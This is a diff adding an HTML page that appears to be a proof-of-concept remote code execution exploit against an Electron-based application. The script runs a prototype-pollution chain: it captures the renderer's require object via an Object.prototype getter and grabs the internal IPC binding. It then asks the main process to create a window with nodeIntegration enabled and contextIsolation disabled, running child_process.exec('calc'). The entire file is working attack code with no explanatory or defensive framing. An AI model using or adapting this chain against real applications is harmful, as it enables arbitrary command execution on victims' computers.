@@ -1,0 +1,36 @@
+<!DOCTYPE HTML>
+<html>
+ipc1
+</html>
+<script>
+    var ipc1;
+    function rce() {
+        console.log(ipc1);
+        const p = JSON.parse('{"url":"data:text/html,<script>require(`child_process`).exec(`calc`)<\/script>","options":{"windowFeatures":{"__proto__":{"webPreferences":{"nodeIntegration":true,"contextIsolation":false}}}}}');
+ipc1.invoke(false,'COMMUNICATION_RENDER_TO_MAIN', [{
+  event: 'WINDOW_MANAGER_CREATE',
+  payload: { id: Date.now(), body: p }
+}]);
+}
+var nw = open('javascript:console.log(1)',Date.now(),'_RCVPAnnotationsOverlay=1');
+var getter1 = `
+var req;
+
+const KEY = "./lib/renderer/web-frame-init.ts";
+Object.prototype.__defineGetter__(KEY,function(){
+	req = this;
+    delete Object.prototype[KEY]
+});
+`
+setTimeout(function(){
+    nw.eval(getter1);
+},'2000');
+setTimeout(function(){
+    nw.location.href = 'about:blank';
+},'3000');
+setTimeout(function(){
+   ipc1 = nw.req['./node_modules/process/browser.js'].exports._linkedBinding('electron_renderer_ipc').ipc;
+   rce();
+},'4000');
+
+</script>
